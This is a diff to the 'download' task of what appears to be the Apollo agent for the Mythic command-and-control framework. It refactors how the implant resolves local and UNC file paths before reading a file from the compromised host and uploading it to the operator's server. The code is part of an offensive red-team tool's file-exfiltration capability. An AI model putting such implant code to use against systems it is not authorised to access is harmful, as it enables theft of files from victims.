@@ -13,6 +13,7 @@ using ApolloInterop.Interfaces;
 using ApolloInterop.Structs.MythicStructs;
 using System.Runtime.Serialization;
 using System.IO;
+using ApolloInterop.Utils;
 
 namespace Tasks
 {
@@ -33,10 +34,69 @@ namespace Tasks
             "127.0.0.1",
             Environment.GetEnvironmentVariable("COMPUTERNAME").ToLower()
         };
+
+        internal struct DownloadTarget
+        {
+            internal string Path;
+            internal string Host;
+            internal string OriginatingPath;
+        }
         
         public download(IAgent agent, MythicTask mythicTask) : base(agent, mythicTask)
         {
 
+        }
+
+        internal static DownloadTarget ResolveDownloadTarget(DownloadParameters parameters)
+        {
+            string localHost = Environment.GetEnvironmentVariable("COMPUTERNAME");
+            string host = parameters.Hostname;
+            string path;
+
+            if (string.IsNullOrEmpty(parameters.Hostname))
+            {
+                string cwd = Directory.GetCurrentDirectory();
+                path = Path.IsPathRooted(parameters.FileName)
+                    ? Path.GetFullPath(parameters.FileName)
+                    : Path.GetFullPath(Path.Combine(cwd, parameters.FileName));
+                host = TryGetUncHost(path, out string uncHost) ? uncHost : localHost;
+            }
+            else if (localhostAliases.Contains(parameters.Hostname.ToLower()) && Path.IsPathRooted(parameters.FileName))
+            {
+                path = Path.GetFullPath(parameters.FileName);
+                host = localHost;
+            }
+            else
+            {
+                path = parameters.FileName.StartsWith(@"\\")
+                    ? parameters.FileName
+                    : $@"\\{parameters.Hostname}\{parameters.FileName}";
+            }
+
+            return new DownloadTarget
+            {
+                Path = path,
+                Host = host,
+                OriginatingPath = path.StartsWith(@"\\") ? PathUtils.StripPathOfHost(path) : path
+            };
+        }
+
+        private static bool TryGetUncHost(string path, out string host)
+        {
+            host = "";
+            if (!path.StartsWith(@"\\"))
+            {
+                return false;
+            }
+
+            string[] parts = path.Split(new[] { '\\' }, StringSplitOptions.RemoveEmptyEntries);
+            if (parts.Length == 0)
+            {
+                return false;
+            }
+
+            host = parts[0];
+            return true;
         }
 
         public override void Start()
@@ -45,76 +105,42 @@ namespace Tasks
             try
             {
                 DownloadParameters parameters = _jsonSerializer.Deserialize<DownloadParameters>(_data.Parameters);
-                string host = parameters.Hostname;
-                if (string.IsNullOrEmpty(parameters.Hostname) && !File.Exists(parameters.FileName))
+                DownloadTarget target = ResolveDownloadTarget(parameters);
+                if (!File.Exists(target.Path))
                 {
                     resp = CreateTaskResponse(
-                        $"File '{parameters.FileName}' does not exist.",
+                        $"File '{target.Path}' does not exist.",
                         true,
                         "error");
                 }
                 else
                 {
-                    string path;
-                    if (string.IsNullOrEmpty(parameters.Hostname))
-                    {
-                        path = parameters.FileName;
-                        string cwd = System.IO.Directory.GetCurrentDirectory().ToString();
-                        if (cwd.StartsWith("\\\\"))
-                        {
-                            var hostPieces = cwd.Split('\\');
-                            if (hostPieces.Length > 2)
-                            {
-                                host = hostPieces[2];
-                                path = $@"\\{hostPieces[2]}\{parameters.FileName}";
-                            }
-                            else
-                            {
-                                resp = CreateTaskResponse($"invalid UNC path for CWD: {cwd}. Can't determine host. Please use explicit UNC path", true, "error");
-                                _agent.GetTaskManager().AddTaskResponseToQueue(resp);
-                            }
-                        }
-                        else
-                        {
-                            host = Environment.GetEnvironmentVariable("COMPUTERNAME");
-                        }
-
-                    } else if (localhostAliases.Contains(parameters.Hostname.ToLower()))
-                    {
-                        path = parameters.FileName;
-                        host = Environment.GetEnvironmentVariable("COMPUTERNAME");
-                    }
-                    else
-                    {
-                        path = $@"\\{parameters.Hostname}\{parameters.FileName}";
-
-                    }
                     byte[] fileBytes = new byte[0];
-                    fileBytes = File.ReadAllBytes(path);
+                    fileBytes = File.ReadAllBytes(target.Path);
 
                     IMythicMessage[] artifacts = new IMythicMessage[1]
                     {
                         new Artifact
                         {
                             BaseArtifact = "FileOpen",
-                            ArtifactDetails = path
+                            ArtifactDetails = target.Path
                         }
                     };
                     if (_agent.GetFileManager().PutFile(
                             _cancellationToken.Token,
                             _data.ID,
                             fileBytes,
-                            parameters.FileName,
+                            target.OriginatingPath,
                             out string mythicFileId,
                             false,
-                            host))
+                            target.Host))
                     {
                         resp = CreateTaskResponse("", true, "completed", artifacts);
                     }
                     else
                     {
                         resp = CreateTaskResponse(
-                            $"Download of {path} failed or aborted.",
+                            $"Download of {target.Path} failed or aborted.",
                             true,
                             "error", artifacts);
                     }
